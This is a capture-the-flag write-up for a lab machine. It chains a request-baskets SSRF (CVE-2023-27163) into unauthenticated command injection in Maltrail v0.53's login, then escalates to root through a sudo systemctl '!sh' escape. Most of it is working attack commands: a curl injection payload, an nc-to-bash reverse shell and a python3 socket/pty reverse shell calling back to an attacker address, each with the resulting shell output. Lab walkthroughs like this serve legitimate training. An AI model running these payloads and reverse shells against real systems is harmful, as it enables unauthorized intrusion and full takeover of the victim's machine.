@@ -1,0 +1,158 @@
+Nmap scan result:
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 13:38 CEST
+Nmap scan report for 10.10.11.224
+Host is up (0.028s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
+|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
+|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
+80/tcp    filtered http
+55555/tcp open     unknown
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Wed, 26 Jul 2023 11:38:56 GMT
+|     Content-Length: 75
+|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Content-Type: text/html; charset=utf-8
+|     Location: /web
+|     Date: Wed, 26 Jul 2023 11:38:30 GMT
+|     Content-Length: 27
+|     href="/web">Found</a>.
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: GET, OPTIONS
+|     Date: Wed, 26 Jul 2023 11:38:30 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.c
+SF-Port55555-TCP:V=7.93%I=7%D=7/26%Time=64C105B9%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
+SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2026\x20Jul\x20
+SF:2023\x2011:38:30\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
+SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
+SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2026\x20Jul\x20
+SF:2023\x2011:38:30\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
+SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
+SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
+SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
+SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options
+SF::\x20nosniff\r\nDate:\x20Wed,\x2026\x20Jul\x202023\x2011:38:56\x20GMT\r
+SF:\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20nam
+SF:e\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\
+SF:n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
+SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
+SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
+SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
+SF:se\r\n\r\n400\x20Bad\x20Request");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 91.13 seconds
+
+
+This shows ssh, and two HTTP. Port 80 doesn't seem accessable, 55555 does. 
+We go to this site and get a website where we can make baskets.
+
+There is a possibility to enter a master token.
+
+When creating a basket we get a token for basket 8h30694 the token is: "uDMicx-rxGLqq-SRWd2fdaheTF8Npt0zT3K8tpLBJCLL".
+It seems to be a random string consisting out of 3 parts A-B-C.
+
+At the bottom of the site we also find a link to the git repo: https://github.com/darklynx/request-baskets
+
+We search for a CVE with this program.
+And find: CVE-2023-27163
+
+
+We might be able to access the webserver on port 80 by utilising the baskets. We can use the basket to get to the site running on port 80 that is not accessible from our network.
+
+When we configure the basket to make us go to 10.10.11.224:80 we can take a look at the site that runs there by going to http://10.10.11.224:55555/zmhfmc9.
+We see that thisis a Maltrail site V0.53. 
+
+Maltrail <= v0.54 is vulnerable to unauthenticated OS command injection during the login process.
+https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
+
+We can change our basket to redirect to 10.10.11.224:80/login and then use that to get the os command injection.
+
+To see the responses of the injection we can send the response back in a new post request using the following command.
+
+curl -X POST --data 'username=;`curl -X POST http://10.10.11.224:55555/zmhfmc9 --data "$(id)"`' http://10.10.11.224:55555/zmhfmc9
+
+
+Now we need to get a shell. A way of doing this is by first making a shell with nc that allowes us to get a python shell.
+
+1.
+
+nc -nlvp 9000
+curl -X POST --data 'username=;`nc 10.10.14.123 9000 | /bin/bash`' http://10.10.11.224:55555/zmhfmc9 
+
+--> shell on 9000
+
+2. 
+
+nc -nlvp 9001
+listening on [any] 9000 ...
+connect to [10.10.14.123] from (UNKNOWN) [10.10.11.224] 36192
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.123",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+--> shell on 9001 
+
+listening on [any] 9001 ...
+connect to [10.10.14.123] from (UNKNOWN) [10.10.11.224] 32844
+puma@sau:/opt/maltrail$ cat ~/user.txt
+
+Now we can get the userflag.
+
+To get the root flag we enter the command sudo -l 
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+
+
+we lookup the privesk with this possibility and find that we can enter !sh and get root priv
+https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/
+
+
+puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
+sudo /usr/bin/systemctl status trail.service
+WARNING: terminal is not fully functional
+-  (press RETURN)!sh
+!sshh!sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cat ~/root.txt
+
+
+
+
+
